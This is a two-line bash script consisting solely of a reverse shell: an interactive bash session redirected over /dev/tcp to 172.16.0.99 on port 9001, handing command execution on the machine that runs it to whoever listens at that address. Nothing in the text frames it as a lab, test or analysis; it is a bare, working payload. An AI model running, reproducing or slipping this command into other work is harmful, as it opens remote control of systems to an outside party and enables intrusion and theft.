#!/bin/bash
bash -i >& /dev/tcp/172.16.0.99/9001 0>&1
